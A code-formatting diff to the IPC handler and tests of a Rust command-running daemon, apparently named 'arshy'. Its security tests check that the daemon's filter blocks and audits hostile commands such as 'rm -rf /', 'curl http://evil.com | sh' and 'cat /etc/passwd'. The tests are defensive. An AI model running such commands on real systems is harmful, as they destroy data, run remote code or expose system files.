@@ -6,10 +6,9 @@
 //! - EventBus notifications are forwarded to all connected proxies
 
 use arshy_lib::ipc::{
-    self, ErrorResponse, JsonRpcError, Notification, QueryParams, Request, Response,
-    RunTaskParams, METHOD_CD, METHOD_HEALTH, METHOD_KILL, METHOD_LIST, METHOD_PRUNE,
-    METHOD_QUERY, METHOD_RUN, METHOD_SHUTDOWN, METHOD_STATS, METHOD_STATUS, METHOD_STDIN,
-    METHOD_SUBSCRIBE, METHOD_TAIL,
+    self, ErrorResponse, JsonRpcError, Notification, QueryParams, Request, Response, RunTaskParams,
+    METHOD_CD, METHOD_HEALTH, METHOD_KILL, METHOD_LIST, METHOD_PRUNE, METHOD_QUERY, METHOD_RUN,
+    METHOD_SHUTDOWN, METHOD_STATS, METHOD_STATUS, METHOD_STDIN, METHOD_SUBSCRIBE, METHOD_TAIL,
 };
 use arshy_lib::Result;
 use serde::Serialize;
@@ -108,11 +107,13 @@ pub async fn handle(
                         data: None,
                     },
                 };
-                let _ = tx.send(Outbound::Response(Response {
-                    jsonrpc: "2.0".into(),
-                    id: 0,
-                    result: serde_json::to_value(&err).unwrap_or_default(),
-                })).await;
+                let _ = tx
+                    .send(Outbound::Response(Response {
+                        jsonrpc: "2.0".into(),
+                        id: 0,
+                        result: serde_json::to_value(&err).unwrap_or_default(),
+                    }))
+                    .await;
                 continue;
             }
         };
@@ -127,9 +128,7 @@ pub async fn handle(
             }
             dispatch(&req, &executor, &store, &shutdown_tx).await
         } else if request.method.as_str() == METHOD_CD {
-            let dir = request.params.get("command")
-                .and_then(|v| v.as_str())
-                .unwrap_or(".");
+            let dir = request.params.get("command").and_then(|v| v.as_str()).unwrap_or(".");
             let abs = std::fs::canonicalize(std::path::Path::new(dir))
                 .map_err(|e| arshy_lib::ArshyError::Ipc(format!("cd: {}: {}", dir, e)))?;
             let cwd_str = abs.to_string_lossy().to_string();
@@ -143,10 +142,8 @@ pub async fn handle(
                     let task_id = task_id_str.to_string();
 
                     // If task already complete, return immediately
-                    let immediate = store.get_task(&task_id)
-                        .ok()
-                        .flatten()
-                        .filter(|t| t.status.is_terminal());
+                    let immediate =
+                        store.get_task(&task_id).ok().flatten().filter(|t| t.status.is_terminal());
 
                     if let Some(task) = immediate {
                         Ok(serde_json::json!({
@@ -196,11 +193,9 @@ pub async fn handle(
             dispatch(&request, &executor, &store, &shutdown_tx).await
         };
         let outbound = match response {
-            Ok(result) => Outbound::Response(Response {
-                jsonrpc: "2.0".into(),
-                id: request.id,
-                result,
-            }),
+            Ok(result) => {
+                Outbound::Response(Response { jsonrpc: "2.0".into(), id: request.id, result })
+            }
             Err(e) => {
                 // Build error context from request params
                 let mut data = serde_json::json!({ "retryable": e.is_retryable() });
@@ -221,7 +216,8 @@ pub async fn handle(
                             message: e.to_string(),
                             data: Some(data),
                         },
-                    }).unwrap_or_default(),
+                    })
+                    .unwrap_or_default(),
                 })
             }
         };
@@ -254,7 +250,14 @@ async fn dispatch(
         METHOD_RUN => {
             let params: RunTaskParams = serde_json::from_value(request.params.clone())?;
             let result = executor
-                .run(&params.command, params.cwd.as_deref(), params.timeout_ms, &params.mode, params.parse_hint.as_deref(), params.env.as_ref())
+                .run(
+                    &params.command,
+                    params.cwd.as_deref(),
+                    params.timeout_ms,
+                    &params.mode,
+                    params.parse_hint.as_deref(),
+                    params.env.as_ref(),
+                )
                 .await?;
             Ok(serde_json::to_value(&result)?)
         }
@@ -264,37 +267,43 @@ async fn dispatch(
             Ok(serde_json::json!({ "events": events, "total": total }))
         }
         METHOD_LIST => {
-            let status: Option<String> = request
-                .params.get("status").and_then(|v| v.as_str()).map(String::from);
-            let limit: usize = request
-                .params.get("limit").and_then(|v| v.as_u64()).unwrap_or(10) as usize;
+            let status: Option<String> =
+                request.params.get("status").and_then(|v| v.as_str()).map(String::from);
+            let limit: usize =
+                request.params.get("limit").and_then(|v| v.as_u64()).unwrap_or(10) as usize;
             let tasks = store.list_tasks(status.as_deref(), limit)?;
             Ok(serde_json::to_value(&tasks)?)
         }
         METHOD_KILL => {
-            let task_id = request.params.get("task_id")
+            let task_id = request
+                .params
+                .get("task_id")
                 .and_then(|v| v.as_str())
                 .ok_or_else(|| arshy_lib::ArshyError::Ipc("missing task_id".into()))?;
             executor.kill(task_id).await?;
             Ok(serde_json::json!({ "task_id": task_id, "status": "killed" }))
         }
         METHOD_TAIL => {
-            let task_id = request.params.get("task_id")
+            let task_id = request
+                .params
+                .get("task_id")
                 .and_then(|v| v.as_str())
                 .ok_or_else(|| arshy_lib::ArshyError::Ipc("missing task_id".into()))?;
-            let lines: usize = request.params.get("lines")
-                .and_then(|v| v.as_u64()).unwrap_or(50) as usize;
-            let format: String = request.params.get("format")
-                .and_then(|v| v.as_str()).unwrap_or("event").to_string();
+            let lines: usize =
+                request.params.get("lines").and_then(|v| v.as_u64()).unwrap_or(50) as usize;
+            let format: String = request
+                .params
+                .get("format")
+                .and_then(|v| v.as_str())
+                .unwrap_or("event")
+                .to_string();
             let output = executor.tail(task_id, lines, &format).await?;
             Ok(serde_json::json!({ "task_id": task_id, "lines": output }))
         }
         METHOD_STATUS => {
             let all = store.list_tasks(None, 10_000)?;
             let running = store.list_tasks(Some("running"), 10_000)?.len();
-            let db_size = store.get_stats(None)
-                .ok()
-                .and_then(|s| s.db_size_bytes);
+            let db_size = store.get_stats(None).ok().and_then(|s| s.db_size_bytes);
             Ok(serde_json::json!({
                 "uptime_secs": daemon_uptime_secs(),
                 "tasks_running": running,
@@ -306,12 +315,9 @@ async fn dispatch(
         METHOD_HEALTH => {
             // Deep health check — verifies store and executor are functional.
             let store_ok = store.list_tasks(Some("running"), 1).is_ok();
-            let running_count = store.list_tasks(Some("running"), 10_000)
-                .map(|t| t.len())
-                .unwrap_or(0);
-            let total_tasks = store.list_tasks(None, 1)
-                .map(|t| t.len())
-                .unwrap_or(0);
+            let running_count =
+                store.list_tasks(Some("running"), 10_000).map(|t| t.len()).unwrap_or(0);
+            let total_tasks = store.list_tasks(None, 1).map(|t| t.len()).unwrap_or(0);
             Ok(serde_json::json!({
                 "status": if store_ok { "ok" } else { "degraded" },
                 "store_ok": store_ok,
@@ -322,10 +328,9 @@ async fn dispatch(
             }))
         }
         METHOD_PRUNE => {
-            let keep = request.params.get("keep")
-                .and_then(|v| v.as_u64()).map(|v| v as usize);
-            let older_than = request.params.get("older_than")
-                .and_then(|v| v.as_u64()).map(|v| v as u32);
+            let keep = request.params.get("keep").and_then(|v| v.as_u64()).map(|v| v as usize);
+            let older_than =
+                request.params.get("older_than").and_then(|v| v.as_u64()).map(|v| v as u32);
             let (td, ed) = if let Some(k) = keep {
                 store.prune_keep(k)?
             } else if let Some(d) = older_than {
@@ -340,18 +345,13 @@ async fn dispatch(
             Ok(serde_json::json!({ "status": "shutting_down" }))
         }
         METHOD_STATS => {
-            let db_path = request.params.get("db_path")
-                .and_then(|v| v.as_str())
-                .map(std::path::Path::new);
+            let db_path =
+                request.params.get("db_path").and_then(|v| v.as_str()).map(std::path::Path::new);
             let stats = store.get_stats(db_path)?;
             Ok(serde_json::to_value(&stats)?)
         }
-        METHOD_STDIN => Err(arshy_lib::ArshyError::Ipc(
-            "stdin write not supported yet".into(),
-        )),
-        _ => Err(arshy_lib::ArshyError::Ipc(format!(
-            "unknown method: {}", request.method
-        ))),
+        METHOD_STDIN => Err(arshy_lib::ArshyError::Ipc("stdin write not supported yet".into())),
+        _ => Err(arshy_lib::ArshyError::Ipc(format!("unknown method: {}", request.method))),
     }
 }
 
@@ -388,18 +388,20 @@ fn daemon_uptime_secs() -> u64 {
 
 #[cfg(test)]
 mod tests {
+    use super::super::parser::Engine;
     use super::*;
     use arshy_lib::config::ParserConfig;
-    use super::super::parser::Engine;
-    use arshy_lib::ipc::{DaemonConnection, Notification, METHOD_KILL, METHOD_LIST,
-        METHOD_PRUNE, METHOD_QUERY, METHOD_RUN, METHOD_SHUTDOWN, METHOD_STATS,
-        METHOD_STATUS, METHOD_SUBSCRIBE, METHOD_TAIL};
+    use arshy_lib::ipc::{
+        DaemonConnection, Notification, METHOD_KILL, METHOD_LIST, METHOD_PRUNE, METHOD_QUERY,
+        METHOD_RUN, METHOD_SHUTDOWN, METHOD_STATS, METHOD_STATUS, METHOD_SUBSCRIBE, METHOD_TAIL,
+    };
     use std::sync::Arc;
     use tempfile::TempDir;
     use tokio::net::UnixStream;
     use tokio::sync::mpsc;
 
-    async fn spawn_daemon_pair() -> (DaemonConnection, mpsc::Receiver<Notification>, Arc<Store>, TempDir) {
+    async fn spawn_daemon_pair(
+    ) -> (DaemonConnection, mpsc::Receiver<Notification>, Arc<Store>, TempDir) {
         let (client_stream, daemon_stream) = UnixStream::pair().unwrap();
         let tmp = TempDir::new().unwrap();
         let db_path = tmp.path().join("test.db");
@@ -426,9 +428,15 @@ mod tests {
     #[tokio::test]
     async fn e2e_run_async() {
         let (mut conn, _notif_rx, store, _tmp) = spawn_daemon_pair().await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo hello", "mode": "async",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo hello", "mode": "async",
+                }),
+            )
+            .await
+            .unwrap();
         let task_id = resp.result["task_id"].as_str().unwrap();
         assert!(!task_id.is_empty());
         assert_eq!(resp.result["status"], "running");
@@ -440,9 +448,15 @@ mod tests {
     #[tokio::test]
     async fn e2e_run_sync() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo sync_test", "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo sync_test", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert_eq!(resp.result["status"], "completed");
         assert_eq!(resp.result["exit_code"], 0);
         assert!(resp.result["duration_ms"].as_u64().unwrap() > 0);
@@ -451,9 +465,15 @@ mod tests {
     #[tokio::test]
     async fn e2e_run_sync_failure() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "exit 42", "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "exit 42", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert_eq!(resp.result["status"], "failed");
         assert_eq!(resp.result["exit_code"], 42);
     }
@@ -461,13 +481,25 @@ mod tests {
     #[tokio::test]
     async fn e2e_query_after_run() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        let run_resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo query_test", "mode": "sync",
-        })).await.unwrap();
+        let run_resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo query_test", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         let task_id = run_resp.result["task_id"].as_str().unwrap().to_string();
-        let query_resp = conn.send_request(METHOD_QUERY, serde_json::json!({
-            "task_id": task_id, "limit": 100,
-        })).await.unwrap();
+        let query_resp = conn
+            .send_request(
+                METHOD_QUERY,
+                serde_json::json!({
+                    "task_id": task_id, "limit": 100,
+                }),
+            )
+            .await
+            .unwrap();
         let total = query_resp.result["total"].as_u64().unwrap();
         assert!(total >= 1);
     }
@@ -475,12 +507,22 @@ mod tests {
     #[tokio::test]
     async fn e2e_list_tasks() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo a", "mode": "sync",
-        })).await.unwrap();
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo b", "mode": "sync",
-        })).await.unwrap();
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "echo a", "mode": "sync",
+            }),
+        )
+        .await
+        .unwrap();
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "echo b", "mode": "sync",
+            }),
+        )
+        .await
+        .unwrap();
         let resp = conn.send_request(METHOD_LIST, serde_json::json!({"limit": 100})).await.unwrap();
         let tasks = resp.result.as_array().unwrap();
         assert!(tasks.len() >= 2);
@@ -489,13 +531,25 @@ mod tests {
     #[tokio::test]
     async fn e2e_tail() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        let run_resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "printf 'line1\\nline2\\nline3\\n'", "mode": "sync",
-        })).await.unwrap();
+        let run_resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "printf 'line1\\nline2\\nline3\\n'", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         let task_id = run_resp.result["task_id"].as_str().unwrap();
-        let tail_resp = conn.send_request(METHOD_TAIL, serde_json::json!({
-            "task_id": task_id, "lines": 10,
-        })).await.unwrap();
+        let tail_resp = conn
+            .send_request(
+                METHOD_TAIL,
+                serde_json::json!({
+                    "task_id": task_id, "lines": 10,
+                }),
+            )
+            .await
+            .unwrap();
         let lines = tail_resp.result["lines"].as_array().unwrap();
         let line_strs: Vec<&str> = lines.iter().map(|v| v.as_str().unwrap()).collect();
         assert!(line_strs.contains(&"line1"));
@@ -514,13 +568,19 @@ mod tests {
     async fn e2e_prune() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
         for i in 0..3 {
-            conn.send_request(METHOD_RUN, serde_json::json!({
-                "command": format!("echo prune_{}", i), "mode": "sync",
-            })).await.unwrap();
+            conn.send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": format!("echo prune_{}", i), "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         }
         let resp = conn.send_request(METHOD_PRUNE, serde_json::json!({"keep": 1})).await.unwrap();
         assert!(resp.result["tasks_deleted"].as_u64().unwrap() >= 1);
-        let list_resp = conn.send_request(METHOD_LIST, serde_json::json!({"limit": 100})).await.unwrap();
+        let list_resp =
+            conn.send_request(METHOD_LIST, serde_json::json!({"limit": 100})).await.unwrap();
         assert_eq!(list_resp.result.as_array().unwrap().len(), 1);
     }
 
@@ -544,12 +604,22 @@ mod tests {
     #[tokio::test]
     async fn e2e_stats_after_tasks() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo ok", "mode": "sync",
-        })).await.unwrap();
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "exit 1", "mode": "sync",
-        })).await.unwrap();
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "echo ok", "mode": "sync",
+            }),
+        )
+        .await
+        .unwrap();
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "exit 1", "mode": "sync",
+            }),
+        )
+        .await
+        .unwrap();
 
         let resp = conn.send_request(METHOD_STATS, serde_json::json!({})).await.unwrap();
         assert_eq!(resp.result["total_tasks"], 2);
@@ -585,16 +655,22 @@ mod tests {
     #[tokio::test]
     async fn e2e_notification_on_run() {
         let (mut conn, mut notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo notif_test", "mode": "async",
-        })).await.unwrap();
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "echo notif_test", "mode": "async",
+            }),
+        )
+        .await
+        .unwrap();
 
         let mut got_update = false;
         let mut got_complete = false;
         let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(5);
 
         while tokio::time::Instant::now() < deadline {
-            match tokio::time::timeout(std::time::Duration::from_millis(200), notif_rx.recv()).await {
+            match tokio::time::timeout(std::time::Duration::from_millis(200), notif_rx.recv()).await
+            {
                 Ok(Some(notif)) => match notif.method.as_str() {
                     "task/update" => got_update = true,
                     "task/complete" => {
@@ -605,7 +681,9 @@ mod tests {
                 },
                 _ => continue,
             }
-            if got_update && got_complete { break; }
+            if got_update && got_complete {
+                break;
+            }
         }
         assert!(got_update, "never received task/update");
         assert!(got_complete, "never received task/complete");
@@ -616,9 +694,15 @@ mod tests {
     #[tokio::test]
     async fn e2e_kill_nonexistent_task() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        let resp = conn.send_request(METHOD_KILL, serde_json::json!({
-            "task_id": "nonexistent",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_KILL,
+                serde_json::json!({
+                    "task_id": "nonexistent",
+                }),
+            )
+            .await
+            .unwrap();
         assert_eq!(resp.result["status"], "killed");
     }
 
@@ -636,9 +720,15 @@ mod tests {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
         let mut task_ids = Vec::new();
         for i in 0..5 {
-            let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-                "command": format!("echo task_{}", i), "mode": "sync",
-            })).await.unwrap();
+            let resp = conn
+                .send_request(
+                    METHOD_RUN,
+                    serde_json::json!({
+                        "command": format!("echo task_{}", i), "mode": "sync",
+                    }),
+                )
+                .await
+                .unwrap();
             task_ids.push(resp.result["task_id"].as_str().unwrap().to_string());
         }
         let unique: std::collections::HashSet<_> = task_ids.iter().collect();
@@ -679,12 +769,18 @@ mod tests {
         let (mut conn2, _notif2) = DaemonConnection::new(c2);
 
         let (r1, r2) = tokio::join!(
-            conn1.send_request(METHOD_RUN, serde_json::json!({
-                "command": "echo from_conn1", "mode": "sync",
-            })),
-            conn2.send_request(METHOD_RUN, serde_json::json!({
-                "command": "echo from_conn2", "mode": "sync",
-            })),
+            conn1.send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo from_conn1", "mode": "sync",
+                })
+            ),
+            conn2.send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo from_conn2", "mode": "sync",
+                })
+            ),
         );
         assert_eq!(r1.unwrap().result["status"], "completed");
         assert_eq!(r2.unwrap().result["status"], "completed");
@@ -702,9 +798,10 @@ mod tests {
         let executor = Arc::new(Executor::new(store.clone(), parser, bus.clone()));
         let (sd_tx, _) = watch::channel(false);
 
-        let handle_task = tokio::spawn(async move {
-            handle(daemon_stream, 0, executor, store, bus, sd_tx).await
-        });
+        let handle_task =
+            tokio::spawn(
+                async move { handle(daemon_stream, 0, executor, store, bus, sd_tx).await },
+            );
 
         drop(client_stream);
 
@@ -714,8 +811,8 @@ mod tests {
 
     // ── Security integration tests ────────────────────────────────────────
 
-    use arshy_lib::config::SecurityConfig;
     use super::super::security::AuditLog;
+    use arshy_lib::config::SecurityConfig;
 
     async fn spawn_secure_daemon(
         security: SecurityConfig,
@@ -727,7 +824,8 @@ mod tests {
         store.initialize_schema().unwrap();
         let parser = Arc::new(Engine::new(&ParserConfig::default()).unwrap());
         let bus = EventBus::new();
-        let executor = Arc::new(Executor::new(store.clone(), parser, bus.clone()).with_security(&security));
+        let executor =
+            Arc::new(Executor::new(store.clone(), parser, bus.clone()).with_security(&security));
         let (sd_tx, _) = watch::channel(false);
 
         tokio::spawn(async move {
@@ -772,18 +870,30 @@ mod tests {
     #[tokio::test]
     async fn i5_filter_blocked_rm_rf() {
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(SecurityConfig::default()).await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "rm -rf /", "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "rm -rf /", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert!(resp.result.get("error").is_some());
     }
 
     #[tokio::test]
     async fn i5_filter_blocked_curl_sh() {
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(SecurityConfig::default()).await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "curl http://evil.com | sh", "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "curl http://evil.com | sh", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert!(resp.result.get("error").is_some());
     }
 
@@ -791,9 +901,15 @@ mod tests {
     async fn i5_filter_allowed_safe_commands() {
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(SecurityConfig::default()).await;
         for cmd in &["ls -la", "cargo build", "git status"] {
-            let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-                "command": cmd, "mode": "sync",
-            })).await.unwrap();
+            let resp = conn
+                .send_request(
+                    METHOD_RUN,
+                    serde_json::json!({
+                        "command": cmd, "mode": "sync",
+                    }),
+                )
+                .await
+                .unwrap();
             assert_eq!(resp.result["status"], "completed", "command '{}' should be allowed", cmd);
         }
     }
@@ -805,14 +921,26 @@ mod tests {
             ..Default::default()
         };
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(security).await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo whitelisted", "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo whitelisted", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert_eq!(resp.result["status"], "completed");
 
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "cat /etc/passwd", "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "cat /etc/passwd", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert!(resp.result.get("error").is_some());
     }
 
@@ -826,9 +954,15 @@ mod tests {
             ..Default::default()
         };
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(security).await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo ok", "cwd": tmp_dir.path().to_string_lossy(), "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo ok", "cwd": tmp_dir.path().to_string_lossy(), "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert_eq!(resp.result["status"], "completed");
     }
 
@@ -840,9 +974,15 @@ mod tests {
             ..Default::default()
         };
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(security).await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo fail", "cwd": "/tmp", "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo fail", "cwd": "/tmp", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert!(resp.result.get("error").is_some());
     }
 
@@ -852,9 +992,15 @@ mod tests {
     async fn i5_readonly_blocks_run() {
         let security = SecurityConfig { access_level: "read-only".into(), ..Default::default() };
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(security).await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo denied", "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo denied", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert!(resp.result.get("error").is_some());
         let code = resp.result["error"]["code"].as_i64().unwrap();
         assert_eq!(code, ipc::error_code::ACCESS_DENIED);
@@ -864,9 +1010,15 @@ mod tests {
     async fn i5_readonly_blocks_kill() {
         let security = SecurityConfig { access_level: "read-only".into(), ..Default::default() };
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(security).await;
-        let resp = conn.send_request(METHOD_KILL, serde_json::json!({
-            "task_id": "fake",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_KILL,
+                serde_json::json!({
+                    "task_id": "fake",
+                }),
+            )
+            .await
+            .unwrap();
         assert!(resp.result.get("error").is_some());
     }
 
@@ -874,9 +1026,15 @@ mod tests {
     async fn i5_readonly_allows_query() {
         let security = SecurityConfig { access_level: "read-only".into(), ..Default::default() };
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(security).await;
-        let resp = conn.send_request(METHOD_QUERY, serde_json::json!({
-            "task_id": "nonexistent", "limit": 10,
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_QUERY,
+                serde_json::json!({
+                    "task_id": "nonexistent", "limit": 10,
+                }),
+            )
+            .await
+            .unwrap();
         assert!(resp.result.get("error").is_none());
     }
 
@@ -892,9 +1050,15 @@ mod tests {
     async fn i5_full_mode_allows_all() {
         let security = SecurityConfig { access_level: "full".into(), ..Default::default() };
         let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon(security).await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo full", "mode": "sync",
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo full", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert_eq!(resp.result["status"], "completed");
     }
 
@@ -904,12 +1068,17 @@ mod tests {
     async fn i5_audit_log_on_run() {
         let tmp = TempDir::new().unwrap();
         let audit_path = tmp.path().join("audit.log");
-        let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon_with_audit(
-            SecurityConfig::default(), &audit_path,
-        ).await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo audit_test", "mode": "sync",
-        })).await.unwrap();
+        let (mut conn, _notif_rx, _tmp) =
+            spawn_secure_daemon_with_audit(SecurityConfig::default(), &audit_path).await;
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo audit_test", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert_eq!(resp.result["status"], "completed");
         tokio::time::sleep(std::time::Duration::from_millis(200)).await;
         let content = std::fs::read_to_string(&audit_path).unwrap();
@@ -920,12 +1089,16 @@ mod tests {
     async fn i5_audit_log_blocked_command() {
         let tmp = TempDir::new().unwrap();
         let audit_path = tmp.path().join("audit.log");
-        let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon_with_audit(
-            SecurityConfig::default(), &audit_path,
-        ).await;
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "rm -rf /", "mode": "sync",
-        })).await.unwrap();
+        let (mut conn, _notif_rx, _tmp) =
+            spawn_secure_daemon_with_audit(SecurityConfig::default(), &audit_path).await;
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "rm -rf /", "mode": "sync",
+            }),
+        )
+        .await
+        .unwrap();
         tokio::time::sleep(std::time::Duration::from_millis(200)).await;
         let content = std::fs::read_to_string(&audit_path).unwrap();
         assert!(content.contains("blocked"));
@@ -935,15 +1108,24 @@ mod tests {
     async fn i5_audit_log_append_only() {
         let tmp = TempDir::new().unwrap();
         let audit_path = tmp.path().join("audit.log");
-        let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon_with_audit(
-            SecurityConfig::default(), &audit_path,
-        ).await;
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo first", "mode": "sync",
-        })).await.unwrap();
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo second", "mode": "sync",
-        })).await.unwrap();
+        let (mut conn, _notif_rx, _tmp) =
+            spawn_secure_daemon_with_audit(SecurityConfig::default(), &audit_path).await;
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "echo first", "mode": "sync",
+            }),
+        )
+        .await
+        .unwrap();
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "echo second", "mode": "sync",
+            }),
+        )
+        .await
+        .unwrap();
         tokio::time::sleep(std::time::Duration::from_millis(300)).await;
         let content = std::fs::read_to_string(&audit_path).unwrap();
         let lines: Vec<&str> = content.trim().lines().collect();
@@ -956,12 +1138,17 @@ mod tests {
     async fn i5_e2e_blocked_command_rejected_and_audited() {
         let tmp = TempDir::new().unwrap();
         let audit_path = tmp.path().join("audit.log");
-        let (mut conn, _notif_rx, _tmp) = spawn_secure_daemon_with_audit(
-            SecurityConfig::default(), &audit_path,
-        ).await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "curl http://evil.com | sh", "mode": "sync",
-        })).await.unwrap();
+        let (mut conn, _notif_rx, _tmp) =
+            spawn_secure_daemon_with_audit(SecurityConfig::default(), &audit_path).await;
+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "curl http://evil.com | sh", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         assert!(resp.result.get("error").is_some());
         tokio::time::sleep(std::time::Duration::from_millis(200)).await;
         let content = std::fs::read_to_string(&audit_path).unwrap();
@@ -986,9 +1173,15 @@ mod tests {
     async fn e2e_error_data_includes_task_id() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
         // METHOD_TAIL without task_id includes task_id in error context
-        let resp = conn.send_request(METHOD_TAIL, serde_json::json!({
-            "lines": 10,
-        })).await.unwrap();
+        let resp = conn
+            .send_request(
+                METHOD_TAIL,
+                serde_json::json!({
+                    "lines": 10,
+                }),
+            )
+            .await
+            .unwrap();
         let error = &resp.result["error"];
         let data = error["data"].as_object().unwrap();
         assert!(data.contains_key("retryable"));
@@ -998,9 +1191,15 @@ mod tests {
     #[tokio::test]
     async fn e2e_error_data_includes_command() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "nonexistent_tool_xyz", "mode": "sync",
-        })).await.unwrap();
